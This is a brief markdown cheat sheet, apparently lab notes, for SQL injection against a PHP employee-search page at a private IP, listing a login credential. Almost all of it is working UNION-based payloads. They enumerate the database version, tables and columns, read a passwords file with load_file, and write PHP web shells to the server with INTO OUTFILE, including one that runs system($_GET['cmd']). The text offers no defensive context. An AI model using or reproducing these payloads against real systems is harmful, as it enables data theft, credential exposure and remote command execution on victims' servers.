# Advanced SQL Injection Exploitation. 


Login Information 

http://192.168.43.66/ems/searchemp.php 

NKader@gmail.com - admin


###Enumeration of information 


	admin' union select 1,2,3,4,5,6,7,8,9# 

	admin' union select version(),2,3,4,5,6,7,8,9# 

	admin' union select group_concat(table_name),2,3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()# 

	admin' union select group_concat(column_name),2,3,4,5,6,7,8,9 from information_schema.columns where table_name='users'# 
	

### Loading the File 


```
admin'union select load_file('C:\\passwords.txt'),2,3,4,5,6,7,8,9-- 
```

### Writing the File 

```

admin'union select ("<?php echo shell_exec('dir > filename1.txt')>"),2,3,4,5,6,7,8,9 into outfile "shell.php" --  

admin'union select ("<?php system($_GET['cmd'])?>"),2,3,4,5,6,7,8,9 into outfile "shell1.php" --  

```